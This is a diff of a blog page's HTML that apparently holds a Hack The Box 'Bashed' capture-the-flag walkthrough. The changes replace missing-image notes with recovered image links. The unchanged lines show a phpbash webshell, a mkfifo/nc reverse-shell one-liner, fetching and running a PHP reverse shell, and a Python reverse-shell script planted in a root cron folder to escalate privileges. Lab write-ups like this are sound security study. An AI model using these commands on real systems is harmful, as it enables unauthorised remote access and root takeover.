@@ -241,34 +241,22 @@ PORT   STATE SERVICE VERSION
 <p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/521e5c0f03ab.png" alt="AgdMvj.md.png"></p>
 <p><code>phpbash</code> seems to be a webshell tool. And there is a github repository <a href="https://github.com/Arrexel/phpbash">phpbash</a> introduces the tool. The introduction of the repo is to drop the file to target and access it by <code>http://ip/uploads/phpbash.php</code>. Try to access <code>http://10.10.10.68/uploads/phpbash.php</code>. But the file seems not to be here.</p>
 <p>Utilize the dirbuster to enumerate the directories.</p>
-<blockquote>
-<p><strong>（配图未能自动恢复）</strong> 原地址：<code>https://s2.ax1x.com/2019/04/04/AgfJCd.png</code></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-d5419d222f2a7cb394fe9672057b2a4c.jpeg" alt="目录枚举结果"></p>
 <p>Wow. Find it and open the file <code>phpbash.php</code>. Here is the webshell. I have tried to reverse shell by <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.44 1234 &gt;/tmp/f</code>. But the shell cannot be returned. Whatever, I can obtain the user.txt.</p>
-<blockquote>
-<p><strong>（配图未能自动恢复）</strong> 原地址：<code>https://s2.ax1x.com/2019/04/04/AgfTPJ.png</code></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-c439457e1ef8408cf6abdf3be1382013.jpeg" alt="phpbash 访问结果"></p>
 <p>It is convenient to get the reverse shell. So I try to upload a php shell to the target machine. The detailed php script can be found <a href="https://github.com/neal1991/htb/blob/master/Bashed/php-reverse-shell.php">here</a>. And I server the php script by <code>python -m SimpleHTTPServer 80</code>. Then download the php script from the target machine. To ensure the script can be written to the target machine. Select a path can be written, for example: <code>/tmp</code>.</p>
-<blockquote>
-<p><strong>（配图未能自动恢复）</strong> 原地址：<code>https://s2.ax1x.com/2019/04/04/AghFMt.png</code></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-3f30f06c5683338e29ddbb5cb72f6d77.jpeg" alt="上传反向 shell"></p>
 <p><code>wget http://10.10.16.44/php-reverse-shell.php</code></p>
 <p>Then in the kali, set the <code>nc</code> listen to port 1234:</p>
 <p><code>nc -lvnp 1234</code></p>
 <p>Execute the php script in the target machine <code>php php-reverse-shell.php</code>. OK. We obtain the reverse shell.</p>
-<blockquote>
-<p><strong>（配图未能自动恢复）</strong> 原地址：<code>https://s2.ax1x.com/2019/04/04/AghBsx.png</code></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-aefb1584033a0e261c69d39a290f1690.jpeg" alt="获得反向 shell"></p>
 <h2 id="privilege-escalation">Privilege escalation</h2>
 <p>Obtain the user permission is quite easy, and it is not difficult to obtain the root permission. Utilize <code>sudo -l</code> to see the permissions of the user. Something interesting found. We can switch to <code>scriptmanager</code> user without password.</p>
-<blockquote>
-<p><strong>（配图未能自动恢复）</strong> 原地址：<code>https://s2.ax1x.com/2019/04/04/AghhQI.png</code></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-761cb2ccff8b621fc9f1306d381b992c.jpeg" alt="切换 scriptmanager 用户"></p>
 <pre tabindex="0"><code>su -u scrriptmanager bash -i
 </code></pre><p>Try to enumerate the files. And I find an interesting folder inside <code>/scripts</code>. There are two files <code>test.py</code> and <code>test.txt</code>. Try to display the content of <code>test.py</code>.</p>
-<blockquote>
-<p><strong>（配图未能自动恢复）</strong> 原地址：<code>https://s2.ax1x.com/2019/04/04/Ag4cn0.png</code></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-4fab395364e5f39d027b318354d871e7.jpeg" alt="test.py 定时任务"></p>
 <p>The python script is quite straightforward. It just writes <code>testing 123!</code> to the file <code>test.txt</code>. And if we see the attributes of <code>test.txt</code>, the modified time of the file changes each minute. And the file is owned by root. It seems that <code>root</code> will execute the python scripts in <code>/scripts</code> folder each minute. So utilize a python script to reverse the root shell(according to the information above, the python version of the target machine is 2.7):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os;
 </span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM);
@@ -278,9 +266,7 @@ PORT   STATE SERVICE VERSION
 </span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>);
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span>]);
 </span></span></code></pre></div><p>Set the kali listen to port 4444. Download the python script in the target machine and execute. Now, root shell is obtained.</p>
-<blockquote>
-<p><strong>（配图未能自动恢复）</strong> 原地址：<code>https://s2.ax1x.com/2019/04/04/AghxO0.png</code></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-319cbc50e465764882005b216aefbb09.jpeg" alt="获得 root shell"></p>
 <h2 id="练习要点">练习要点</h2>
 <p>Bashed 一类箱子常强调：</p>
 <ul>
